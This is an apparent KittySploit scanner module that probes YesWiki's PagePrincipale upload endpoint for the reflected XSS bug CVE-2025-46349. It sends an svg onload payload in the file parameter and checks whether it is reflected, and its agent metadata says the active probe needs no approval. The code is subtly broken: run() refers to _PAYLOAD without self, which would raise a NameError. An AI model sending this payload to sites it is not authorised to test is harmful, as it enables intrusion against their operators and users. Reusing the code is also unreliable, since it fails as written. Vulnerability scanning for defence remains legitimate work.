#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""YesWiki CVE-2025-46349 reflected XSS via file upload form."""

from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "YesWiki Reflected XSS via File Upload Detection",
        "description": (
            "Probes the YesWiki PagePrincipale upload endpoint for reflected XSS "
            "(CVE-2025-46349). Requires YesWiki fingerprints and payload reflection; "
            "rejects SPA catch-all responses."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "tags": ["web", "scanner", "cve", "cve2025", "xss", "yeswiki"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": [],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "admin_surface", "from_detail": ""},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
        "references": [
            "https://github.com/YesWiki/yeswiki/security/advisories/GHSA-2f8p-qqx2-gwr2",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-46349",
        ],
        "cve": "CVE-2025-46349",
    }

    _PAYLOAD = '"><svg/onload=alert(document.domain)>'
    _PATH = f"/?PagePrincipale/upload&file={quote(_PAYLOAD, safe='')}"
    _YESWIKI_MARKERS = (
        "yeswiki",
        "yeswiki-base",
        "wakka.php",
        "pageprincipale",
    )

    def run(self):
        response = self.http_request(method="GET", path=self._PATH, allow_redirects=False)
        if not response or int(response.status_code or 0) != 200:
            return False
        if self.is_same_as_index(response, path=self._PATH):
            return False

        body = response.text or ""
        body_lower = body.lower()
        if not any(marker in body_lower for marker in self._YESWIKI_MARKERS):
            return False

        reflected = (
            _PAYLOAD in body
            or "<svg/onload=alert(document.domain)>" in body
            or "<svg/onload=alert(document.domain)".lower() in body_lower
        )
        if not reflected:
            return False

        self.set_info(
            severity="high",
            reason="YesWiki reflected XSS via file upload (CVE-2025-46349)",
            path=self._PATH,
            cve="CVE-2025-46349",
        )
        return True
